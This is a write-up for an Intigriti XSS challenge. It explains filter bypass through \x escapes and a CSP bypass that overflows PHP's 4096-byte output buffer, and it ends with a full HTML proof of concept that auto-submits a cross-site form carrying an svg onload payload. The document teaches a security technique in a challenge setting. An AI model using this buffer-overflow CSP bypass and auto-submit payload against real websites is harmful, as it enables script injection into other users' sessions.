## Summary

![image](https://user-images.githubusercontent.com/49112423/160453210-0289c053-378d-440f-9d6e-88e39b9f5e88.png)

In the challenge-0322 problem, FirstText and Hashing parameter values are passed to the server. We can inject HTML because the value of FirstText is inserted directly inside the document. However, some filtering exists, but this can be bypassed via the \x* characters. Now we can bypass the filtering and insert a full XSS PoC. But as a second problem, CSP existed. However, this can be circumvented with one trick. The default buffer size in php is 4096 bytes. If we pass a value larger than 4096 bytes as a parameter value, CSP is not set because the response comes before the header() function that sets CSP is called.

Now, to make this self-xss into reflected xss, we need to create a PoC. I created a PoC as below and uploaded it to my private server. One thing to be aware of when creating PoC is to use the GET method in the current browser to make a request to the problem before making a POST request from the problem. Otherwise, The token is not set, send at least one request from the gui error occurs. So, I opened it using the window.open() function before the POST request. yes it works fine.

[+] It's a pity I didn't receive 300 Euros 😀 

---
## Proof of Concept

```html
<!doctype html>
<html>
  <head>
    <title>challenge-0322 poc</title>
  </head>
  <body>
      <h1>challenge-0322 poc</h1>
      <form id="poc" action="https://challenge-0322.intigriti.io/challenge/LoveReceiver.php" method="POST">
          <input type="hidden" name="token" value="c340547ec61d280c42f22b733d46685a5d39abd32d317da9c4c1505b132f14a8">
          <input type="hidden" name="FirstText" value="asdf">
          <input type="hidden" name="Hashing" value="asdf">
      </form>
      <script>
            document.getElementsByTagName('input')[1].value =  `${'a'.repeat(5000)}<svg onload='location.href = "javascript:alert\\x28document.domain\\x29"'>`;
            document.getElementsByTagName('input')[2].value =  `${'a'.repeat(5000)}<svg onload='location.href = "javascript:alert\\x28document.domain\\x29"'>`;

            window.open('https://challenge-0322.intigriti.io/challenge/LoveSender.php');
            setTimeout(() => poc.submit(), 1500);
      </script>
  </body>
</html>
```
